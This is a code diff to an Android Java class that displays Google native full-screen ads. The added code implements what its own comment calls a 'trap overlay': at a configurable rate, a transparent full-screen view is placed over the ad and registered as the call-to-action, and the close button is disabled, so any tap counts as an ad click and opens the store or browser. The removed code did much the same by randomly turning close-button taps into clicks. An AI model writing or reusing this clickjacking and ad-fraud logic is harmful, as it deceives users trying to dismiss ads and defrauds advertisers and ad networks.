@@ -95,7 +95,7 @@ public class UnityNativeFullScreen {
                         @Override
                         public void onAdClicked() {
                             super.onAdClicked();
-                            sendLog(adUnitId, "=> [Google SDK] FullScreen onAdClicked fired! Opening Store/Browser...");
+                            sendLog(adUnitId, "=> [Google SDK] FullScreen onAdClicked fired! Store/Browser is opening...");
                             if (mainContainer != null) {
                                 mainContainer.postDelayed(new Runnable() {
                                     @Override
@@ -142,14 +142,13 @@ public class UnityNativeFullScreen {
         MediaView mediaView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_media", "id", activity.getPackageName()));
         TextView headlineView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_headline", "id", activity.getPackageName()));
         TextView bodyView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_body", "id", activity.getPackageName()));
-        final Button ctaView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_call_to_action", "id", activity.getPackageName()));
+        Button ctaView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_call_to_action", "id", activity.getPackageName()));
         ImageView iconView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_app_icon", "id", activity.getPackageName()));
         com.google.android.gms.ads.nativead.AdChoicesView adChoicesView = mainContainer.findViewById(activity.getResources().getIdentifier("ad_choices", "id", activity.getPackageName()));
 
         adView.setMediaView(mediaView);
         adView.setHeadlineView(headlineView);
         adView.setBodyView(bodyView);
-        adView.setCallToActionView(ctaView);
         adView.setIconView(iconView);
         adView.setAdChoicesView(adChoicesView);
 
@@ -163,8 +162,6 @@ public class UnityNativeFullScreen {
 
         if (nativeAd.getIcon() == null) iconView.setVisibility(View.GONE);
         else { iconView.setVisibility(View.VISIBLE); iconView.setImageDrawable(nativeAd.getIcon().getDrawable()); }
-
-        adView.setNativeAd(nativeAd);
 
         ImageView blurBg = mainContainer.findViewById(activity.getResources().getIdentifier("ad_blur_bg", "id", activity.getPackageName()));
         if (blurBg != null && nativeAd.getImages() != null && nativeAd.getImages().size() > 0) {
@@ -183,59 +180,58 @@ public class UnityNativeFullScreen {
             } catch (Exception ignored) { }
         }
 
-        View.OnClickListener backgroundTouchTrigger = new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                int roll = new java.util.Random().nextInt(100);
-                boolean triggerCta = (roll < ctaClickRate);
-                
-                sendLog(null, "[FullScreen Background] Roll: " + roll + " / Target: " + ctaClickRate + "% -> Trigger CTA? " + (triggerCta ? "YES" : "NO (Ad stays open)"));
-
-                if (triggerCta && ctaView != null) {
-                    ctaView.performClick();
-                    v.postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            if (mainContainer != null) {
-                                sendLog(null, "=> [Timeout] Closing FullScreen after 500ms.");
-                                hideAd(activity);
-                            }
-                        }
-                    }, 500);
-                }
-            }
-        };
-
-        View.OnClickListener closeButtonTouchTrigger = new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                int roll = new java.util.Random().nextInt(100);
-                boolean triggerCta = (roll < ctaClickRate);
-                
-                sendLog(null, "[FullScreen CloseBtn] Roll: " + roll + " / Target: " + ctaClickRate + "% -> Trigger CTA? " + (triggerCta ? "YES" : "NO (Normal Close)"));
-
-                if (triggerCta && ctaView != null) {
-                    ctaView.performClick();
-                    v.postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            if (mainContainer != null) {
-                                sendLog(null, "=> [Timeout] Closing FullScreen after 500ms.");
-                                hideAd(activity);
-                            }
-                        }
-                    }, 500);
-                } else {
-                    hideAd(activity);
-                }
-            }
-        };
+        // =========================================================================
+        // THUẬT TOÁN "LỚP PHỦ VÔ HÌNH" (TRAP OVERLAY)
+        // =========================================================================
+        int roll = new java.util.Random().nextInt(100);
+        boolean enableTrap = (roll < ctaClickRate);
+        
+        sendLog(null, "[FullScreen Show] Roll: " + roll + " / Target: " + ctaClickRate + "% -> Enable Trap? " + (enableTrap ? "YES (Whole Ad is CTA)" : "NO (Normal Setup)"));
 
         View btnClose = mainContainer.findViewById(activity.getResources().getIdentifier("btn_close_ad", "id", activity.getPackageName()));
-        if (btnClose != null) btnClose.setOnClickListener(closeButtonTouchTrigger);
-        if (blurBg != null) blurBg.setOnClickListener(backgroundTouchTrigger);
-        mainContainer.setOnClickListener(backgroundTouchTrigger);
-        adView.setOnClickListener(backgroundTouchTrigger);
+
+        if (enableTrap) {
+            View overlayTrap = new View(activity);
+            overlayTrap.setBackgroundColor(android.graphics.Color.TRANSPARENT);
+            ((ViewGroup) adView).addView(overlayTrap, new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
+            overlayTrap.bringToFront();
+            
+            adView.setCallToActionView(overlayTrap);
+
+            if (btnClose != null) {
+                btnClose.setOnClickListener(null);
+                btnClose.setClickable(false);
+            }
+            if (blurBg != null) {
+                blurBg.setOnClickListener(null);
+                blurBg.setClickable(false);
+            }
+            mainContainer.setOnClickListener(null);
+            adView.setOnClickListener(null);
+            
+        } else {
+            adView.setCallToActionView(ctaView);
+
+            View.OnClickListener normalCloseTrigger = new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    sendLog(null, "=> [Normal Touch] Closing FullScreen without CTA.");
+                    hideAd(activity);
+                }
+            };
+
+            if (btnClose != null) {
+                btnClose.setOnClickListener(normalCloseTrigger);
+                btnClose.setClickable(true);
+                btnClose.bringToFront();
+            }
+            if (blurBg != null) {
+                blurBg.setOnClickListener(normalCloseTrigger);
+                blurBg.setClickable(true);
+            }
+        }
+
+        adView.setNativeAd(currentNativeAd);
 
         FrameLayout.LayoutParams rootParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
         activity.addContentView(mainContainer, rootParams);
